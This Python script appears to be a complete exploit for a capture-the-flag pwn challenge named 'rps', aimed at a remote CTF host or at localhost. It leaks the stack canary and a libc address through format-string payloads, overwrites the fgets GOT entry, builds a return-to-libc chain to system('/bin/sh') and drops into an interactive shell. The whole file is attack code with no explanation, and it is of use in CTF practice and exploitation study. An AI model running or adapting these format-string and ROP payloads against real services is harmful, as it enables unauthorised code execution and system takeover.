import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def main():
    printf_got = 0x804a010
    fgets_got = 0x804a018

    # set score = 30
    buf = "A"*4
    buf += "\x1e"
    buf += "\x00"*3

    read_until(f, "(rps)")
    f.write(buf+"\n")

    # leak canary
    buf = "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
    read_until(f, ">>")
    f.write(buf+"\n")
    read_until(f, "(nil)")
    canary = int(f.read(10),16)
    
    # leak got
    buf = "A"
    buf += p(printf_got)
    buf += "%10$s"

    read_until(f, "(y/n)")
    f.write("n\n")
    read_until(f, ">>")
    f.write(buf+"\n")
    read_until(f, p(printf_got))
    libc_base = u(f.read(4)) - printf_offset
    system = libc_base + system_offset
    binsh = libc_base + binsh_offset
    gets = libc_base + gets_offset

    # GOT overwrite
    read_until(f, "(y/n)")
    f.write("n\n")
    buf = "%"+str(((gets&~0xffff)>>16)-11)+"x%18$hn"
    buf += "%"+str((gets&0xffff)+(65536-4-((system&~0xffff)>>16)))+"x%17$hn"
    buf = buf.ljust(29,"A") # padding "A"
    buf += p(fgets_got)+p(fgets_got+2)
    read_until(f, ">>")
    f.write(buf+"\n")

    # Overwrite return address and set ROP
    buf = "A"*53
    buf += p(canary)
    buf += "A"*28
    buf += p(system)
    buf += p(0xdeadbeef)
    buf += p(binsh)

    read_until(f, "(y/n)")
    f.write("n\n")
    read_until(f, ">>")
    f.write(buf+"\n")
    read_until(f, "(y/n)")
    f.write("y\n")

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("rps.ctfq.maguro.run", 10006)
        printf_offset = 0x004d4a0
        system_offset = 0x000403b0
        binsh_offset = 0x1615a4
        gets_offset = 0x0065810
        main()
    else:
        s, f = sock("localhost", 10006)
        printf_offset = 0x004d410
        system_offset = 0x00040310
        binsh_offset = 0x162cec
        gets_offset = 0x0064e60
        main()
